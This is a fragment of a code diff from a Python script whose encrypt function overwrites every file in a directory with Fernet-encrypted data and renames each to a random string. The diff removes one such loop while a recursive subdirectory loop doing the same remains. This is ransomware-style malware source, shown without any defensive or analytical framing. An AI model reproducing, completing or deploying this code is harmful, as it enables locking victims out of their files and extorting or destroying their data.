@@ -116,17 +116,6 @@ def start():
 
 def encrypt(dir, key):
     f = Fernet(key)
-    for filename in glob.glob(os.path.join(dir, '*.*'), recursive=True):
-        with open(filename, "rb") as file:
-            file_data = file.read()
-            encrypted_data = f.encrypt(file_data)
-        with open(filename, "wb") as new:
-            new.write(encrypted_data)
-
-        extension = str(filename).split(".")[1]
-        name = str(''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(10)))
-        os.rename(filename, dir + "/" + name + "." + extension)
-
     subdirs = [x[0] for x in os.walk(dir)]
     for dirdir in subdirs:
         for filename in glob.glob(os.path.join(dirdir, '*.*'), recursive=True):
